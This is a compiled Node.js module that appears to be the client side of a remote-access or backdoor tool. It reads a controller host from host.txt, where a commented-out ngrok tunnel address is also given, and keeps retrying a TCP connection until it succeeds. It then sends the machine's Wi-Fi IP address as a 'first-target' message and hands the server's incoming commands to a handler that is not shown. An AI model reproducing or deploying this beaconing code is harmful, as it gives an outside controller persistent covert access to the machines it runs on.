"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.id = exports.target = void 0;
const net = __importStar(require("net"));
const os = __importStar(require("os"));
const fs = __importStar(require("fs"));
const getIP_1 = require("./getIP");
const getData_1 = require("./getData");
exports.target = undefined;
// const host:string = "0.tcp.jp.ngrok.io"
// const port:number = 11608
let host = "localhost";
let port = 3000;
exports.id = "";
const hostData = fs.readFileSync("./host.txt").toString();
host = hostData.split(":")[0];
port = Number(hostData.split(":")[1]);
const initSys = () => __awaiter(void 0, void 0, void 0, function* () {
    console.log("connecting server....");
    const networkinfo = os.networkInterfaces()["Wi-Fi"];
    let netData = "";
    if (networkinfo) {
        netData = yield (0, getIP_1.getIp)(networkinfo);
        console.log(netData);
    }
    else {
        netData = "can not get ip";
        console.log(netData);
    }
    yield conServer();
    const firstSendData = {
        type: "first-target",
        data: [
            netData
        ]
    };
    exports.target.write(JSON.stringify(firstSendData));
    exports.target.on("data", (data) => {
        if (!getData_1.startUpload) {
            const getData = JSON.parse(data);
            if (getData.type === "sendIP") {
                exports.id = getData.data[0];
            }
            else {
                (0, getData_1.getSendData)(data);
            }
        }
        else {
            (0, getData_1.getSendData)(data);
        }
    });
});
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const conServer = () => __awaiter(void 0, void 0, void 0, function* () {
    let canntCon = true;
    while (canntCon) {
        exports.target = new net.Socket();
        yield exports.target.connect(port, host, () => {
            console.log(`connected to ${host}:${port}`);
            canntCon = false;
        });
        exports.target.on("error", () => {
            exports.target.end();
            exports.target = undefined;
        });
        yield sleep(2000);
    }
});
initSys();
